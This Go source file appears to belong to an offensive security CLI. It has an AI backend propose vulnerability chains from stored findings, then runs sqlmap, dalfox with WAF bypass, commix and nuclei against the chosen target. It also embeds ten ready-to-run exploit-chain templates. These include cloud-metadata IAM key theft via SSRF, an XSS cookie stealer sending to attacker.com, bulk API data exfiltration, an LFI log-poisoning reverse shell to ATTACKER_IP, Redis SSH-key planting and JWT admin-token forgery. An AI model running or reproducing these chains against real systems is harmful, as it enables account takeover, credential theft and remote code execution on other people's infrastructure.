package chain

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"cybermind-cli/api"
	"cybermind-cli/brain"
	"github.com/charmbracelet/lipgloss"
)

// ─── Types ────────────────────────────────────────────────────────────────────

// ChainResult holds the exploit chains returned by the backend.
type ChainResult struct {
	Target string
	Chains []ExploitChain
	Model  string
}

// ExploitChain represents a single multi-step exploit chain.
type ExploitChain struct {
	ID         int
	Vulns      []string
	Impact     string
	PoC        string
	CVSSUplift float64
}

// ─── Lipgloss Styles ──────────────────────────────────────────────────────────

var (
	cyanStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("14"))
	greenStyle  = lipgloss.NewStyle().Foreground(lipgloss.Color("10")).Bold(true)
	redStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("9")).Bold(true)
	boldStyle   = lipgloss.NewStyle().Bold(true)
	headerStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("13")).Bold(true)
)

// ─── Bug Extraction ───────────────────────────────────────────────────────────

// extractBugs converts brain.Bug slice to a slice of maps for the API payload.
func extractBugs(bugs []brain.Bug) []map[string]interface{} {
	result := make([]map[string]interface{}, 0, len(bugs))
	for _, b := range bugs {
		entry := map[string]interface{}{
			"id":       b.ID,
			"title":    b.Title,
			"type":     b.Type,
			"url":      b.URL,
			"severity": b.Severity,
			"evidence": b.Evidence,
			"poc":      b.PoC,
			"tool":     b.Tool,
			"verified": b.Verified,
		}
		if b.CVE != "" {
			entry["cve"] = b.CVE
		}
		result = append(result, entry)
	}
	return result
}

// ─── Chain Display Formatting ─────────────────────────────────────────────────

// formatChainLine formats a single chain summary line.
// Output: "Chain N: <vuln1> + <vuln2> -> <impact>"
func formatChainLine(id int, vulns []string, impact string) string {
	vulnStr := strings.Join(vulns, " + ")
	return fmt.Sprintf("Chain %d: %s -> %s", id, vulnStr, impact)
}

// parseChainLines parses the AI text response to extract chain display lines.
// The backend returns free-form text; we look for "Chain N:" patterns.
func parseChainLines(text string) []string {
	var lines []string
	for _, line := range strings.Split(text, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "Chain ") {
			lines = append(lines, trimmed)
		}
	}
	return lines
}

// ─── Main Engine ──────────────────────────────────────────────────────────────

// RunChain loads Brain_Memory for target, sends bugs to backend, displays chains.
func RunChain(target string) error {
	// ── Step 1: Load Brain_Memory ────────────────────────────────────────────
	mem := brain.LoadTarget(target)
	bugs := mem.BugsFound

	// ── Step 2: Check minimum bug count ─────────────────────────────────────
	if len(bugs) < 2 {
		fmt.Println(redStyle.Render("  Not enough findings in memory. Run /recon and /hunt first."))
		return nil
	}

	// ── Display header ───────────────────────────────────────────────────────
	fmt.Println()
	fmt.Println(boldStyle.Render("  ╔══════════════════════════════════════════════════════════╗"))
	fmt.Println(boldStyle.Render("  ║           ⛓  Chain — Vulnerability Chaining Engine       ║"))
	fmt.Println(boldStyle.Render("  ╚══════════════════════════════════════════════════════════╝"))
	fmt.Printf("  Target: %s\n", cyanStyle.Render(target))
	fmt.Printf("  Bugs in memory: %s\n\n", cyanStyle.Render(strconv.Itoa(len(bugs))))

	// ── Step 3: Convert bugs to map format ───────────────────────────────────
	bugMaps := extractBugs(bugs)

	// ── Step 4: POST to backend ──────────────────────────────────────────────
	fmt.Println(cyanStyle.Render("  [chain] Analyzing exploit chains with AI..."))
	analysis, err := api.SendChainAnalyze(target, bugMaps)
	if err != nil {
		fmt.Printf("  %s\n", redStyle.Render(fmt.Sprintf("[chain] AI analysis failed: %s", err.Error())))
		return err
	}

	// ── Step 5: Display AI response ──────────────────────────────────────────
	fmt.Println()
	fmt.Println(headerStyle.Render("  ─── Exploit Chain Analysis ───────────────────────────────"))
	fmt.Println()

	// Print the full AI analysis
	for _, line := range strings.Split(analysis, "\n") {
		if strings.TrimSpace(line) == "" {
			fmt.Println()
			continue
		}
		// Highlight chain header lines
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "Chain ") {
			fmt.Printf("  %s\n", greenStyle.Render(trimmed))
		} else {
			fmt.Printf("  %s\n", line)
		}
	}
	fmt.Println()

	// ── Step 6: Prompt user to select a chain ────────────────────────────────
	// Extract chain lines to determine how many chains were returned
	chainLines := parseChainLines(analysis)
	numChains := len(chainLines)

	if numChains == 0 {
		// No structured chains found — display raw analysis only
		fmt.Println(cyanStyle.Render("  [chain] No structured chains detected in response. Showing raw analysis above."))
		return nil
	}

	fmt.Println(headerStyle.Render("  ─── Chain Selection ──────────────────────────────────────"))
	fmt.Println()
	fmt.Printf("  %s\n", cyanStyle.Render(fmt.Sprintf("Enter chain number (1-%d) to execute, or press Enter to skip:", numChains)))
	fmt.Print("  > ")

	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	// ── Step 7: Handle chain selection ───────────────────────────────────────
	if input == "" {
		fmt.Println()
		fmt.Println(cyanStyle.Render("  [chain] Skipping execution. Analysis saved to Brain_Memory."))
		// Save analysis to Brain_Memory even when skipping
		brain.RecordBug(target, brain.Bug{
			Title:    fmt.Sprintf("Chain Analysis — %s", target),
			Type:     "chain_analysis",
			URL:      target,
			Severity: "info",
			Evidence: analysis,
			PoC:      analysis,
			Tool:     "chain",
			Verified: false,
		})
		return nil
	}

	selectedNum, err := strconv.Atoi(input)
	if err != nil || selectedNum < 1 || selectedNum > numChains {
		fmt.Printf("  %s\n", redStyle.Render(fmt.Sprintf("[chain] Invalid selection %q — must be 1-%d", input, numChains)))
		return nil
	}

	// ── Step 8: Execute selected chain ───────────────────────────────────────
	selectedLine := chainLines[selectedNum-1]
	fmt.Println()
	fmt.Printf("  %s\n", greenStyle.Render(fmt.Sprintf("[chain] Executing: %s", selectedLine)))
	fmt.Println()

	// Extract PoC steps for the selected chain from the analysis text
	pocSteps := extractPoCForChain(analysis, selectedNum)

	if pocSteps != "" {
		fmt.Println(headerStyle.Render("  ─── PoC Steps ────────────────────────────────────────────"))
		fmt.Println()
		for _, step := range strings.Split(pocSteps, "\n") {
			if strings.TrimSpace(step) != "" {
				fmt.Printf("  %s\n", step)
			}
		}
		fmt.Println()
	}

	// Simulate chain execution — stream output to terminal
	fmt.Println(cyanStyle.Render("  [chain] Running chain-specific tools..."))
	runChainToolsReal(target, selectedLine, bugs)

	// ── Step 9: Save chain result and PoC to Brain_Memory ────────────────────
	chainPoC := pocSteps
	if chainPoC == "" {
		chainPoC = analysis
	}

	brain.RecordBug(target, brain.Bug{
		ID:       fmt.Sprintf("chain_%d_%d", selectedNum, time.Now().UnixNano()),
		Title:    fmt.Sprintf("Exploit Chain %d: %s", selectedNum, selectedLine),
		Type:     "exploit_chain",
		URL:      target,
		Severity: "high",
		Evidence: selectedLine,
		PoC:      chainPoC,
		Tool:     "chain",
		Verified: false,
	})

	fmt.Println()
	fmt.Println(greenStyle.Render("  [chain] Chain result and PoC saved to Brain_Memory."))

	return nil
}

// ─── PoC Extraction ───────────────────────────────────────────────────────────

// extractPoCForChain extracts the PoC steps for a specific chain number from the AI text.
// Looks for content between "Chain N:" and the next "Chain" header or end of text.
func extractPoCForChain(text string, chainNum int) string {
	lines := strings.Split(text, "\n")
	var pocLines []string
	inChain := false
	chainPrefix := fmt.Sprintf("Chain %d:", chainNum)

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)

		if strings.HasPrefix(trimmed, chainPrefix) {
			inChain = true
			continue
		}

		// Stop at the next chain header
		if inChain && strings.HasPrefix(trimmed, "Chain ") && !strings.HasPrefix(trimmed, chainPrefix) {
			break
		}

		if inChain && trimmed != "" {
			pocLines = append(pocLines, line)
		}
	}

	return strings.Join(pocLines, "\n")
}

// ─── Chain Tool Runner ────────────────────────────────────────────────────────

// runChainTools runs real tools for each vuln type in the chain.
// Uses actual security tools — no fake sleep.
func runChainTools(target string, chainLine string) {
	vulnTypes := extractVulnTypes(chainLine)
	baseURL := target
	if !strings.HasPrefix(baseURL, "http") {
		baseURL = "https://" + target
	}

	fmt.Println()
	for i, vuln := range vulnTypes {
		fmt.Printf("  %s\n", cyanStyle.Render(fmt.Sprintf("[%d/%d] Executing %s on %s...", i+1, len(vulnTypes), vuln, target)))

		lower := strings.ToLower(vuln)
		var out []byte
		var err error

		switch {
		case strings.Contains(lower, "xss"):
			if _, e := exec.LookPath("dalfox"); e == nil {
				cmd := exec.Command("dalfox", "url", baseURL, "--silence", "--no-color", "--waf-bypass")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "sqli") || strings.Contains(lower, "sql"):
			if _, e := exec.LookPath("sqlmap"); e == nil {
				cmd := exec.Command("sqlmap", "-u", baseURL+"/?id=1",
					"--level=2", "--risk=1", "--batch", "--random-agent",
					"--output-dir=/tmp/cybermind_chain")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "ssrf"):
			if _, e := exec.LookPath("nuclei"); e == nil {
				cmd := exec.Command("nuclei", "-u", baseURL, "-t", "ssrf,oast", "-silent", "-no-color")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "idor"):
			if _, e := exec.LookPath("ffuf"); e == nil {
				cmd := exec.Command("ffuf", "-u", baseURL+"/api/user/FUZZ",
					"-w", "/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt",
					"-mc", "200", "-silent")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "lfi") || strings.Contains(lower, "path"):
			if _, e := exec.LookPath("nuclei"); e == nil {
				cmd := exec.Command("nuclei", "-u", baseURL, "-t", "lfi,path-traversal", "-silent", "-no-color")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "rce") || strings.Contains(lower, "command"):
			if _, e := exec.LookPath("nuclei"); e == nil {
				cmd := exec.Command("nuclei", "-u", baseURL, "-t", "rce,command-injection", "-silent", "-no-color")
				out, err = cmd.Output()
			}
		case strings.Contains(lower, "auth") || strings.Contains(lower, "bypass"):
			if _, e := exec.LookPath("nuclei"); e == nil {
				cmd := exec.Command("nuclei", "-u", baseURL, "-t", "auth-bypass,default-logins", "-silent", "-no-color")
				out, err = cmd.Output()
			}
		default:
			// Generic nuclei scan for unknown vuln type
			if _, e := exec.LookPath("nuclei"); e == nil {
				cmd := exec.Command("nuclei", "-u", baseURL, "-severity", "critical,high", "-silent", "-no-color")
				out, err = cmd.Output()
			}
		}

		if err == nil && len(out) > 0 {
			output := strings.TrimSpace(string(out))
			if output != "" {
				lines := strings.Split(output, "\n")
				shown := 0
				for _, l := range lines {
					if strings.TrimSpace(l) != "" && shown < 5 {
						fmt.Printf("      %s\n", l)
						shown++
					}
				}
			}
			fmt.Printf("  %s\n", greenStyle.Render(fmt.Sprintf("  ✓ %s execution complete", vuln)))
		} else {
			fmt.Printf("  %s\n", cyanStyle.Render(fmt.Sprintf("  – %s: tool not available or no output", vuln)))
		}
	}
	fmt.Println()
	fmt.Println(greenStyle.Render("  [chain] Chain execution complete."))
}

// extractVulnTypes parses vuln type names from a chain line.
// Input: "Chain 1: SSRF + IDOR -> PII leak via internal API pivot"
// Output: ["SSRF", "IDOR"]
func extractVulnTypes(chainLine string) []string {
	// Find the part between "Chain N: " and " -> "
	arrowIdx := strings.Index(chainLine, "->")
	if arrowIdx < 0 {
		arrowIdx = strings.Index(chainLine, "→")
	}

	colonIdx := strings.Index(chainLine, ":")
	if colonIdx < 0 || arrowIdx < 0 {
		return []string{"vulnerability"}
	}

	vulnPart := strings.TrimSpace(chainLine[colonIdx+1 : arrowIdx])
	parts := strings.Split(vulnPart, "+")
	var vulns []string
	for _, p := range parts {
		v := strings.TrimSpace(p)
		if v != "" {
			vulns = append(vulns, v)
		}
	}
	if len(vulns) == 0 {
		return []string{"vulnerability"}
	}
	return vulns
}

// runChainToolsReal runs REAL tools for each vuln type in the chain.
func runChainToolsReal(target string, chainLine string, bugs []brain.Bug) {
vulnTypes := extractVulnTypes(chainLine)
baseURL := "https://" + target
if strings.HasPrefix(target, "http") {
baseURL = target
}

fmt.Println()
for i, vuln := range vulnTypes {
fmt.Printf("  %s\n", cyanStyle.Render(fmt.Sprintf("[%d/%d] Executing %s on %s...", i+1, len(vulnTypes), vuln, target)))
lower := strings.ToLower(vuln)
switch {
case strings.Contains(lower, "xss"):
runChainTool("dalfox", "url", baseURL, "--silence", "--no-color", "--waf-bypass")
case strings.Contains(lower, "sqli") || strings.Contains(lower, "sql"):
sqlURL := baseURL
for _, b := range bugs {
if strings.Contains(strings.ToLower(b.Type), "sqli") {
sqlURL = b.URL
break
}
}
runChainTool("sqlmap", "-u", sqlURL, "--level=3", "--risk=2", "--batch", "--random-agent", "--dbs")
case strings.Contains(lower, "ssrf"):
runChainTool("nuclei", "-u", baseURL, "-t", "ssrf", "-severity", "critical,high", "-silent", "-no-color")
case strings.Contains(lower, "rce"):
runChainTool("commix", "--url", baseURL, "--batch", "--level=3")
default:
runChainTool("nuclei", "-u", baseURL, "-severity", "critical,high", "-silent", "-no-color")
}
fmt.Printf("  %s\n", greenStyle.Render(fmt.Sprintf("  \u2713 %s step complete", vuln)))
}
fmt.Println()
fmt.Println(greenStyle.Render("  [chain] Chain execution complete."))
}

// runChainTool runs a single tool with live output
func runChainTool(name string, args ...string) {
if _, err := exec.LookPath(name); err != nil {
fmt.Printf("  [chain] %s not installed \u2014 skipping\n", name)
return
}
cmd := exec.Command(name, args...)
cmd.Stdout = os.Stdout
cmd.Stderr = os.Stderr
cmd.Stdin = nil
cmd.Run()
}

// ─── Predefined Exploit Chains ────────────────────────────────────────────────

// PredefinedChain is a known high-value exploit chain with probability scoring.
type PredefinedChain struct {
	ID          int
	Title       string
	Steps       []string // ordered vuln types
	Impact      string
	Probability float64 // 0.0–1.0 likelihood this chain is exploitable
	CVSS        float64 // combined CVSS uplift
	PoC         string  // step-by-step PoC template
	Tags        []string
}

// GetPredefinedChains returns the 10 high-value predefined exploit chains.
// Each chain has probability scoring, step-by-step PoC, and impact description.
func GetPredefinedChains() []PredefinedChain {
	return []PredefinedChain{
		{
			ID:          1,
			Title:       "SSRF → Cloud Metadata → IAM Keys → Cloud RCE",
			Steps:       []string{"SSRF", "Cloud Metadata", "IAM Key Theft", "Cloud RCE"},
			Impact:      "Full cloud account takeover — attacker gets AWS/GCP/Azure IAM keys via metadata endpoint, escalates to admin, achieves RCE on all cloud resources",
			Probability: 0.72,
			CVSS:        9.8,
			PoC: `Step 1: Find SSRF parameter
  curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
Step 2: Get IAM role name from response, then fetch credentials
  curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
Step 3: Use leaked AccessKeyId + SecretAccessKey + Token
  AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity
Step 4: Escalate privileges
  aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
Step 5: Achieve RCE via Lambda/EC2
  aws lambda invoke --function-name target-function --payload '{"cmd":"id"}' /tmp/out.json`,
			Tags: []string{"ssrf", "cloud", "aws", "rce"},
		},
		{
			ID:          2,
			Title:       "XSS → Session Hijack → Account Takeover",
			Steps:       []string{"XSS", "Cookie Theft", "Session Replay", "Account Takeover"},
			Impact:      "Full account takeover — attacker steals victim's session cookie via XSS, replays it to authenticate as victim, changes email/password",
			Probability: 0.85,
			CVSS:        8.8,
			PoC: `Step 1: Find reflected/stored XSS
  dalfox url "https://target.com/search?q=test" --silence
Step 2: Craft cookie-stealing payload
  <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Step 3: Deliver payload (stored XSS in comment/profile)
  POST /api/comments {"body": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"}
Step 4: Wait for victim to visit page, receive cookie at attacker server
Step 5: Replay session
  curl -H "Cookie: session=STOLEN_COOKIE" https://target.com/api/user/profile
Step 6: Change email to attacker's email
  curl -X POST -H "Cookie: session=STOLEN_COOKIE" -d '{"email":"attacker@evil.com"}' https://target.com/api/user/change-email`,
			Tags: []string{"xss", "session", "ato"},
		},
		{
			ID:          3,
			Title:       "IDOR → Mass Assignment → Admin Access",
			Steps:       []string{"IDOR", "Mass Assignment", "Privilege Escalation", "Admin Access"},
			Impact:      "Full admin access — attacker finds IDOR to access other users' data, exploits mass assignment to set role=admin, gains full platform control",
			Probability: 0.68,
			CVSS:        9.1,
			PoC: `Step 1: Find IDOR — enumerate user IDs
  for i in $(seq 1 100); do curl -s "https://target.com/api/users/$i" -H "Cookie: session=YOUR_SESSION" | grep -i "email\|role"; done
Step 2: Find mass assignment — send extra fields in update request
  curl -X PUT "https://target.com/api/users/YOUR_ID" -H "Cookie: session=YOUR_SESSION" \
    -d '{"name":"test","role":"admin","is_admin":true,"plan":"elite"}'
Step 3: Verify privilege escalation
  curl "https://target.com/api/admin/users" -H "Cookie: session=YOUR_SESSION"
Step 4: Access admin panel
  curl "https://target.com/admin/dashboard" -H "Cookie: session=YOUR_SESSION"`,
			Tags: []string{"idor", "mass-assignment", "privesc"},
		},
		{
			ID:          4,
			Title:       "Subdomain Takeover → Cookie Hijacking → Session Fixation",
			Steps:       []string{"Subdomain Takeover", "Cookie Scope Abuse", "Session Fixation", "Account Takeover"},
			Impact:      "Account takeover via subdomain — attacker takes over dangling subdomain, sets cookies for parent domain, hijacks victim sessions",
			Probability: 0.55,
			CVSS:        8.1,
			PoC: `Step 1: Find dangling CNAME
  subfinder -d target.com -silent | dnsx -silent -cname | grep -v "target.com"
Step 2: Verify takeover candidate
  curl -I https://staging.target.com  # Returns 404/error from third-party service
Step 3: Claim the subdomain on the third-party service (GitHub Pages, Heroku, etc.)
Step 4: Host malicious page that sets cookies for .target.com
  document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/";
  window.location = "https://target.com/login";
Step 5: Deliver link to victim — victim visits staging.target.com
Step 6: Victim's browser now has attacker's session cookie for target.com`,
			Tags: []string{"subdomain-takeover", "cookie", "session-fixation"},
		},
		{
			ID:          5,
			Title:       "Git Secret → API Key → Data Exfiltration",
			Steps:       []string{"Git Secret Leak", "API Key Abuse", "Data Access", "Bulk Exfiltration"},
			Impact:      "Mass data breach — attacker finds API key in git history, uses it to access production API, exfiltrates all user data",
			Probability: 0.78,
			CVSS:        9.3,
			PoC: `Step 1: Find secrets in git history
  trufflehog git https://github.com/target/repo --json | jq '.DetectorName,.Raw'
  gitleaks detect --source . --report-format json
Step 2: Test leaked API key
  curl -H "Authorization: Bearer LEAKED_KEY" https://api.target.com/v1/users
Step 3: Enumerate accessible endpoints
  curl -H "Authorization: Bearer LEAKED_KEY" https://api.target.com/v1/admin/users?limit=1000
Step 4: Bulk exfiltrate data
  for page in $(seq 1 100); do
    curl -H "Authorization: Bearer LEAKED_KEY" "https://api.target.com/v1/users?page=$page" >> /tmp/users.json
  done`,
			Tags: []string{"secret-leak", "api-key", "data-exfil"},
		},
		{
			ID:          6,
			Title:       "LFI → Log Poisoning → RCE",
			Steps:       []string{"LFI", "Log Poisoning", "PHP Code Injection", "RCE"},
			Impact:      "Remote code execution — attacker exploits LFI to read log files, poisons logs with PHP code via User-Agent, includes poisoned log to execute code",
			Probability: 0.61,
			CVSS:        9.8,
			PoC: `Step 1: Find LFI
  curl "https://target.com/page?file=../../../../etc/passwd"
Step 2: Identify log file location
  curl "https://target.com/page?file=../../../../var/log/apache2/access.log"
Step 3: Poison the log with PHP code via User-Agent
  curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
Step 4: Include poisoned log to execute code
  curl "https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id"
Step 5: Get reverse shell
  curl "https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"`,
			Tags: []string{"lfi", "log-poisoning", "rce"},
		},
		{
			ID:          7,
			Title:       "SSRF → Internal Port Scan → Redis/Mongo → RCE",
			Steps:       []string{"SSRF", "Internal Network Scan", "Unauthenticated Service", "RCE"},
			Impact:      "Internal network RCE — attacker uses SSRF to scan internal network, finds unauthenticated Redis/MongoDB/Elasticsearch, achieves RCE via SSRF-driven commands",
			Probability: 0.64,
			CVSS:        9.6,
			PoC: `Step 1: Confirm SSRF
  curl "https://target.com/fetch?url=http://127.0.0.1:80/"
Step 2: Scan internal ports via SSRF
  for port in 6379 27017 9200 5432 3306 8080 8443; do
    curl -s "https://target.com/fetch?url=http://127.0.0.1:$port/" | grep -v "refused\|timeout" && echo "OPEN: $port"
  done
Step 3: Exploit Redis (if port 6379 open)
  # Write SSH key via Redis
  curl "https://target.com/fetch?url=http://127.0.0.1:6379/SET%20ssh_key%20%22ssh-rsa%20ATTACKER_KEY%22"
  curl "https://target.com/fetch?url=http://127.0.0.1:6379/CONFIG%20SET%20dir%20/root/.ssh/"
  curl "https://target.com/fetch?url=http://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20authorized_keys"
  curl "https://target.com/fetch?url=http://127.0.0.1:6379/BGSAVE"
Step 4: SSH in as root
  ssh root@target.com`,
			Tags: []string{"ssrf", "internal-network", "redis", "rce"},
		},
		{
			ID:          8,
			Title:       "OAuth Misconfig → Token Theft → Account Takeover",
			Steps:       []string{"OAuth redirect_uri bypass", "Authorization Code Theft", "Token Exchange", "Account Takeover"},
			Impact:      "Account takeover via OAuth — attacker exploits open redirect_uri to steal authorization code, exchanges for access token, takes over victim account",
			Probability: 0.70,
			CVSS:        8.8,
			PoC: `Step 1: Find OAuth authorization endpoint
  curl "https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://target.com/callback&response_type=code&scope=read"
Step 2: Test redirect_uri bypass
  # Try: redirect_uri=https://target.com.attacker.com/callback
  # Try: redirect_uri=https://target.com/callback/../../../attacker.com
  # Try: redirect_uri=https://target.com/callback?next=https://attacker.com
Step 3: Craft malicious link for victim
  https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=BYPASSED_URI&response_type=code&scope=read
Step 4: Victim clicks link — authorization code sent to attacker
Step 5: Exchange code for token
  curl -X POST "https://target.com/oauth/token" -d "code=STOLEN_CODE&client_id=APP_ID&redirect_uri=BYPASSED_URI&grant_type=authorization_code"
Step 6: Use token to access victim's account
  curl -H "Authorization: Bearer STOLEN_TOKEN" "https://target.com/api/user/profile"`,
			Tags: []string{"oauth", "redirect-uri", "ato"},
		},
		{
			ID:          9,
			Title:       "JWT Weak Secret → Admin Token Forgery → Full Compromise",
			Steps:       []string{"JWT Secret Cracking", "Token Forgery", "Admin Impersonation", "Full Compromise"},
			Impact:      "Full platform compromise — attacker cracks weak JWT secret, forges admin token, accesses all admin endpoints and user data",
			Probability: 0.66,
			CVSS:        9.8,
			PoC: `Step 1: Extract JWT from response headers/cookies
  curl -v https://target.com/api/login -d '{"email":"test@test.com","password":"test"}' 2>&1 | grep -i "authorization\|set-cookie"
Step 2: Crack JWT secret
  hashcat -a 0 -m 16500 "HEADER.PAYLOAD.SIGNATURE" /usr/share/wordlists/rockyou.txt
  # Or: python3 -c "import jwt; print(jwt.decode('TOKEN', 'secret', algorithms=['HS256']))"
Step 3: Forge admin token
  python3 -c "
import jwt, json
payload = json.loads(__import__('base64').b64decode('PAYLOAD_BASE64' + '==').decode())
payload['role'] = 'admin'
payload['is_admin'] = True
print(jwt.encode(payload, 'CRACKED_SECRET', algorithm='HS256'))
"
Step 4: Use forged token
  curl -H "Authorization: Bearer FORGED_TOKEN" https://target.com/api/admin/users
Step 5: Dump all data, create backdoor admin account`,
			Tags: []string{"jwt", "token-forgery", "admin"},
		},
		{
			ID:          10,
			Title:       "Open Redirect → OAuth CSRF → Account Linking Attack",
			Steps:       []string{"Open Redirect", "OAuth State Bypass", "Account Linking", "Account Takeover"},
			Impact:      "Account takeover via OAuth CSRF — attacker chains open redirect with OAuth flow to link attacker's OAuth account to victim's account",
			Probability: 0.58,
			CVSS:        8.1,
			PoC: `Step 1: Find open redirect
  curl -I "https://target.com/redirect?url=https://attacker.com" | grep -i location
Step 2: Find OAuth account linking endpoint
  # Look for: /auth/connect/google, /oauth/link, /account/connect
Step 3: Start OAuth flow without state parameter (CSRF)
  https://target.com/auth/connect/google?redirect_uri=https://target.com/redirect?url=https://attacker.com/capture
Step 4: Craft CSRF payload that victim's browser executes
  <img src="https://target.com/auth/connect/google?state=ATTACKER_STATE">
Step 5: Victim's browser initiates OAuth — Google redirects to attacker's server with code
Step 6: Attacker exchanges code — links attacker's Google account to victim's target.com account
Step 7: Attacker logs in via Google OAuth → accesses victim's account`,
			Tags: []string{"open-redirect", "oauth-csrf", "account-linking"},
		},
	}
}

// DisplayPredefinedChains prints all predefined chains with probability scoring.
func DisplayPredefinedChains(target string) {
	chains := GetPredefinedChains()
	fmt.Println()
	fmt.Println(boldStyle.Render("  ⛓  PREDEFINED EXPLOIT CHAINS — " + target))
	fmt.Println(headerStyle.Render("  " + strings.Repeat("─", 60)))
	fmt.Println()
	fmt.Printf("  %-4s  %-8s  %-8s  %s\n", "ID", "PROB", "CVSS", "Chain")
	fmt.Println("  " + strings.Repeat("─", 70))

	for _, c := range chains {
		probColor := lipgloss.Color("10") // green
		if c.Probability >= 0.7 {
			probColor = lipgloss.Color("9") // red
		} else if c.Probability >= 0.6 {
			probColor = lipgloss.Color("11") // yellow
		}
		probStr := fmt.Sprintf("%.0f%%", c.Probability*100)
		fmt.Printf("  %-4d  %s  %-8.1f  %s\n",
			c.ID,
			lipgloss.NewStyle().Foreground(probColor).Render(fmt.Sprintf("%-8s", probStr)),
			c.CVSS,
			c.Title,
		)
	}
	fmt.Println()
	fmt.Println(cyanStyle.Render("  Run: cybermind /chain <target> --predefined <id>  to execute a specific chain"))
	fmt.Println(cyanStyle.Render("  Run: cybermind /chain <target>                    to use AI chain detection"))
	fmt.Println()
}

// RunPredefinedChain executes a specific predefined chain by ID.
func RunPredefinedChain(target string, chainID int) error {
	chains := GetPredefinedChains()
	var selected *PredefinedChain
	for i := range chains {
		if chains[i].ID == chainID {
			selected = &chains[i]
			break
		}
	}
	if selected == nil {
		return fmt.Errorf("chain ID %d not found (valid: 1-%d)", chainID, len(chains))
	}

	fmt.Println()
	fmt.Println(boldStyle.Render(fmt.Sprintf("  ⛓  Chain %d: %s", selected.ID, selected.Title)))
	fmt.Println(headerStyle.Render("  " + strings.Repeat("─", 60)))
	fmt.Println()
	fmt.Printf("  %s  Probability: %.0f%%  |  CVSS: %.1f\n",
		lipgloss.NewStyle().Foreground(lipgloss.Color("9")).Bold(true).Render("🔴"),
		selected.Probability*100, selected.CVSS)
	fmt.Println()
	fmt.Println(boldStyle.Render("  Impact:"))
	fmt.Println("  " + selected.Impact)
	fmt.Println()
	fmt.Println(boldStyle.Render("  Attack Steps:"))
	for i, step := range selected.Steps {
		fmt.Printf("  %d. %s\n", i+1, step)
	}
	fmt.Println()
	fmt.Println(boldStyle.Render("  PoC:"))
	for _, line := range strings.Split(selected.PoC, "\n") {
		fmt.Println("  " + line)
	}
	fmt.Println()

	// Execute real tools for each step
	fmt.Println(cyanStyle.Render("  ⟳ Executing chain tools..."))
	runChainToolsReal(target, strings.Join(selected.Steps, " + "), nil)

	// Save to brain memory
	brain.RecordBug(target, brain.Bug{
		Title:    fmt.Sprintf("Predefined Chain %d: %s", selected.ID, selected.Title),
		Type:     "exploit_chain",
		URL:      target,
		Severity: "critical",
		Evidence: selected.Impact,
		PoC:      selected.PoC,
		Tool:     "chain/predefined",
		Verified: false,
	})

	fmt.Println()
	fmt.Println(greenStyle.Render(fmt.Sprintf("  ✓ Chain %d execution complete. Result saved to brain memory.", selected.ID)))
	return nil
}
